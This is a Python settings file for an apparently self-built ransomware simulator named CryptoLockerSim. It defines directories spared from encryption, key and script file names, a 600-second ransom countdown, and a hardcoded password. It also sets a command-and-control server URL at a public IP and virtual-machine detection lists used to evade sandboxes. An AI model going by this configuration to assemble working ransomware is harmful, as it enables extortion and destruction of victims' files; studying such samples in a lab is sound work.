import os

####################################################################################################################

system_dirs = ["/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var", "/tmp", os.path.expanduser("~/.config/autostart"), "/CryptoLockerSim"]
script_files = ["private.pem", "public.pem", "timer.json", "Main.py", "Timer.py", "Decrypt.py", "Encrypt.py", "key.encrypted", "Variables.py", "requirements.txt", "Move_File.py"]
system_desktop_dirs = system_dirs + [os.path.expanduser("~/.config/autostart"), "/CryptoLockerSim"]
script_name_exe = "Main.exe" # Change to what you have it named as
script_name_elf = "/home/kali/Desktop/CryptoLockerSim/Main.elf" # Currently hardcoded path but will change in the future
seconds_left = 600 # This variable will change the amount of time you have
password = "test"
timer_file_name = "timer.json"

####################################################################################################################

c2_server = "http://13.61.153.195:5000" # Public IP from my EC2 instance
rsa_key = "private.pem"

####################################################################################################################

vm_indicators = ["virtual", "vmware", "qemu", "kvm", "xen", "microsoft", "parallels", "bhyve"]
dmi_files = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/product_version", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/bios_vendor", "/sys/class/dmi/id/bios_version",]
vm_mac_prefixes = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27", "00:15:5d", "00:03:ff", "52:54:00", "00:16:3e", "00:1c:42", "00:14:4f", "00:10:18",]

####################################################################################################################

api_key = "12345"
wrong_api_key = "54321" # Wrong api key just for testing and making sure its working like it should

####################################################################################################################